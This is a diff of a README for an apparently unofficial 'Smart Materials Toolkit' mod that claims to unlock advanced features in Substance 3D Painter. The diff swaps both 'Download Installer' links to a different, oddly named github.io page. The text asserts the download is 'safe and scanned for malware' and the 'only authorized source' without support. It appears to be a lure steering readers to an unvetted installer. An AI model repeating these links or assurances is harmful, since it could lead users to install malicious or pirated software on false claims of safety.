@@ -2,7 +2,7 @@
 
 Substance 3D Painter is a leading 3D texturing application used by artists worldwide for creating detailed materials and textures. This 2026 Smart Materials Toolkit is a comprehensive mod for Windows desktop that unlocks advanced features, including a rich library of smart materials and enhanced texture editing tools. It is designed to boost productivity and creativity, making it an essential addition for anyone working with Substance 3D Painter, whether for professional projects or personal exploration.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Key Features
 
@@ -62,7 +62,7 @@ The toolkit is safe and scanned for malware. However, always download from offic
 
 For the latest version, updates, and additional resources, visit the official download page:
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 This is the only authorized source for downloads. Do not trust other links to ensure safety and authenticity.
 
